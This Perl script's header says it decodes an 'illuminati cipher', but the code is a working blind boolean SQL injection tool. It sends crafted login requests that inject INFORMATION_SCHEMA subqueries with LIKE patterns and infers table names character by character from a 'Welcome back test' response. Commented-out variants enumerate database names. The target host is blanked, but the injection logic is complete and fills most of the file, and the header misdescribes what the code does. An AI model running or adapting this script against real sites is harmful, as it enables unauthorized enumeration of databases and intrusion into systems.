# Copyright (c) 2016-.. #John
#
# Author: #John <pocolab.com@gmail.com>
# URL: http://www.pocolab.com
# Version: 1.0.0

# Commentary:

# Decode illuminati cipher

# License:

# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 3
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with GNU Emacs; see the file COPYING.  If not, write to the
# Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor,
# Boston, MA 02110-1301, USA.
use strict;
use warnings;
use LWP::Simple;
use open ':std', ':encoding(UTF-8)';
use utf8;
use HTTP::Request;
use experimental 'smartmatch';

my$const_url="http://?user=test";
my@results=();

sub makerequest{
	my$p="$_[0]";
	my$i=$_[1];

	my$shit;
	if($i==0){
		$p =~ s/\_/\\\_/g;
		$p =~ s/\%/\\\%/g;
		$p =~ s/\'/\\\'/g;
#		$shit=$const_url."' AND EXISTS(SELECT 1 FROM dual WHERE database() LIKE '".$p."%') AND ''='&password=test&login=login";
#$shit=$const_url."' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA LIKE '".$p."%')>1 AND ''='&password=test&login=login";
$shit=$const_url."' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema<>'information_schema' and table_name LIKE '".$p."%')>0 AND ''='&password=test&login=admin";
	}
	elsif ($i==1){
#		$shit=$const_url."' AND EXISTS(SELECT 1 FROM dual WHERE database() = '".$p."') AND ''='&password=test&login=login";
#$shit=$const_url."' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = '".$p."')>1 AND ''='&password=test&login=login";
$shit=$const_url."' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema<>'information_schema' and table_name = '".$p."')>0 AND ''='&password=test&login=admin";
	}
	my$request=HTTP::Request->new(GET=>$shit);
#$request->content("username=admin&password=1");
	$request->header("Cookie"=>"aaa=bbb");
	my$ua=LWP::UserAgent->new;
	my$response=$ua->request($request);
	if ($response->is_success) {
		return $response->decoded_content;
	}
	else {
#print STDERR $response->status_line, "\n";
	}
}
sub init_i{
my$i=0;
	my$min=0;
	my$max=123;
for($i=$min;$i<$max;$i++){
#$cool{'i'}=
}
}
# TODO make as arr
sub valid_i{
	my$i=$_[0];
	return 
		($i>31&&$i<65)||
#($i>64&&$i<91)||               #  <--- case sensitive
		($i>96&&$i<123)||
		($i==95) # '_'
		?1:0;
}

sub get_result{ # $result, $start
	my$result="$_[0]";
	my$start=$_[1];
	my$min=0;
	my$max=123;
	my$str="";
	my$r;
	my$is_found=0;
label:
	for(my$i=$start;$i<$max;$i++){
		if(valid_i($i)){
			$str=$result."".chr($i);
			print("    i: $i; str: $str\n");
			$r=makerequest($str,0);
			if (index($r, "Welcome back test") != -1) {

				$r=makerequest($str,1);
				if (index($r, "Welcome back test") != -1) {
					$is_found=1;
					$result=$str;
					push(@results, $result);
					print("result: $result\n");
					print("results: @results\n");
				}

				$result=$str;
				$start=0;
				print("res: $result\n");
				goto label;
			}
		}
	}
# TODO: add check for 'special symbols'
	return ($is_found,$result);
}

sub main(){
	my$min=0;
	my$max=123;

	my@result_tuple;
	my$result;
	my@res;

	my$i;
	my$tmp;
	my$l;
	my$start;
	my$lt;
	my$lr;
	my$j;


	my$k;

	for($i=$min;$i<$max;$i++){
		if(valid_i($i)){
			$tmp="";
			$start=$i;
			$j=$i;
			$k=0;
label:
			print("i: $i; j: $j; tmp: $tmp; start: $start; ... k: $k\n");
			@result_tuple=get_result($tmp,$start);
			if(length($result_tuple[0])>0){
				$result=$result_tuple[1];
				$lt=length($tmp);
				$lr=length($result);
				print("lt: $lt; lr: $lr\n");
				if($lt<$lr){
					print("result: $result\n");
					print("results: @results\n");
					@res=split(//,$result);
					$l=$res[$lt];
					$j=ord($l);
					$tmp.=$l;
					$start=ord($res[$lt+1])+1;

					$i=ord($res[0]);
					$k++;
					goto label;
				}
			}
			if($k==0){
				goto ex;
			}
		}
	}

ex:
	print("results: @results\n");

}
main();
